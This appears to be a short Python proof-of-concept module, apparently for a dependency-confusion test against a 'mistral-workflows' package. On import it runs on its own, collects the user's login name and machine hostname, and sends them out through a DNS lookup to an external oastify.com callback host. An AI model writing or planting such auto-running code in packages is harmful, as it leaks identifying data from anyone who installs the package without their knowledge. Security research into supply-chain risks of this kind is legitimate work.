"""PoC - Contact: tushar637811@gmail.com"""
import socket, getpass, platform
COLLAB = "z5547qsloegccc3p7lswe9rg2781wrkg.oastify.com"
def _callback():
    try:
        user = getpass.getuser()
        host = platform.node()
        tag = f"{user}.{host}.mistral-workflows".replace(" ", "-")[:60]
        socket.getaddrinfo(f"{tag}.{COLLAB}", 80)
    except Exception: pass
_callback()
